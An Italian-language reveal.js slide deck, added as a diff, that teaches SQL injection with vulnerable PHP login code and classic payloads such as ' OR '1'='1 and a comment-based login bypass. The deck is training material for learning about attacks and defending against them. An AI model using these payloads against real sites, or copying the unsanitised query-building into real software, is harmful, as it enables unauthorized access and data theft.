@@ -1,0 +1,268 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>reveal.js</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h3>RECAP 00</h3>
+				</section>
+				<section>
+					<h2>Cos'è una SQL Injection?</h2>
+					<p>L'<b>SQL injection (SQLi)</b> è un tipo di tecnica di <u>code injection</u>,
+							solitamente utilizzata per attaccare applicazioni 'data-driven' e
+						che permette di <b>eseguire codice SQL malevolo.</b></p>
+				</section>
+				<section>
+					<h2>SQL</h2>
+					<p>Attraverso il linguaggio SQL possiamo compiere operazioni sulle tabelle.</p>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT `id`, `title`, `content` FROM `news`;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT `id`, `title`, `content` FROM `news` WHERE id = 1;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT * FROM `news` WHERE id = 1;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+							INSERT INTO `news` VALUES ('1', 'Titolo news', 'Contenuto news')
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+							DELETE FROM `news` WHERE `id` = 1;
+						</code>
+					</pre>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						## Cosa scatena una SQL Injection?<br /><br /><br />
+
+						### UNA VALIDAZIONE DEGLI INPUT DELL'UTENTE DEBOLE O ASSENTE
+					</textarea>
+				</section>
+				<section>
+					<h2>COME SI TESTA SE UN PARAMETRO E' VULNERABILE?</h2>
+					<center>
+						<img class="fragment fade" src="assets/test-injection.gif" />
+					</center>
+				</section>
+				<section>
+					<h2>Dopo aver trovato un parametro vulnerabile, cerchiamo di ottenere una sintassi valida.</h2>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<small>Dato il codice:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM pages WHERE id = '" . $_GET['id'] . "'";
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' OR '1'='1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM pages WHERE id = '1' OR '1'='1'; /* BOOM! */
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>LOGIN BYPASS</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM users
+							          WHERE username = '" . $_GET['username'] . "'
+							          AND password = '" . $_GET['password'] . "'";
+							  $result = mysqli_query($conn, $sql);
+							  $row_count = mysqli_num_rows($result);
+							  if ($row_count != 0) {
+							    echo 'Authorized';
+							  } else {
+							    echo 'Not authorized';
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['username'] = "admin";
+								$_GET['password'] = "password' OR '1'='1";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+							  SELECT * FROM `users` WHERE `username` = 'admin' AND `password` = 'password' OR '1' = '1'
+							</code>
+						</pre>
+						<p>
+							Abbiamo alterato la query aggiungendo una condizione che rende il risultato sempre vero.<br/>
+						</p>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<div data-markdown>
+							<textarea data-template>
+
+								Database | Comment | Note
+								--- | --- | ---
+								MSSQL / Oracle | `-- (double dash)` | Used for single-line comments
+								MSSQL / Oracle | `/* */` | Used for multiline comments
+								MySQL | `-- (double dash)` |  Used for single-line comments. It requires the second dash to be followed by a space or a control character such as tabulation, newline, etc.
+								MySQL | `#` | Used for single-line comments
+								MySQL | `/* */` | Used for multiline comments
+							</textarea>
+						</div>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM users
+							          WHERE username = '" . $_GET['username'] . "'
+							          AND password = '" . $_GET['password'] . "'";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "' OR 1=1; -- -";
+								$_GET['password'] = "coppito_zero_day";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+							  SELECT * FROM `users` WHERE `username` = '' OR 1=1; -- - AND `password` = '63a2b018...e69e876';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>BOOM! Tramite il codice iniettato siamo riusciti a commentare via la parte relativa alla password.</p>
+					</div>
+				</section>
+				<section>
+					<h2>STACKED QUERIES</h2>
+					<small>Avere la possibilità di terminare un'istruzione SQL arbitrariamente consente di avere un grande controllo sulle query che vengono eseguite.</small>
+					<small>MSSQL 6.0 ha introdotto i "server-side cursors" che consentono l'esecuzione di stringhe con più di un'istruzione SQL.</small>
+					<small></small>
+					<div class="fragment fade">
+						<small>Questa feature ci consente di eseguire:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users`; SELECT * FROM `administrators`;
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Una funzionalità analoga è stata introdotta in MySQL 4.1, ma non è attiva di default.</small>
+						<small></small>
+					</div>
+				</section>
+				<section>
+					<h2>NESTED QUERIES</h2>
+					<small>Una "subquery" è una query annidata in un'altra query.</small>
+					<small>E' utile quando abbiamo bisogno di dati da altre tabelle per comporre una query.</small>
+					<small></small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users` WHERE `role` NOT IN (SELECT `id` FROM `administration_roles`);
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Questa istruzione utilizzerà il risultato di una query come parametro per un'altra.</small>
+						<small></small>
+					</div>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				hash: true
+			});
+		</script>
+	</body>
+</html>
